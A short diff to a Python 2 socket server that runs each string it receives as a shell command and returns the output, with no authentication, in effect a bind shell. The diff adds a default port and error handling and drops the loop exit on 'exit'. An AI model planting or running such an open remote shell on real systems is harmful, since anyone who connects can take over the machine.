@@ -15,7 +15,8 @@ if '-p' in sys.argv:
     except:
         print "Invalid port input"
         PORT = 5000
-
+else:
+    PORT = 5000
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -29,8 +30,10 @@ while 1:
         break
     if data == "exit":
         conn.sendall(data)
-        break
-    out = subprocess.check_output(data, shell=True)
+    try:
+        out = subprocess.check_output(data, stderr=subprocess.STDOUT, shell=True)
+    except Exception, e:
+        out = str(e.output)
     conn.sendall(out)
 
 conn.close()
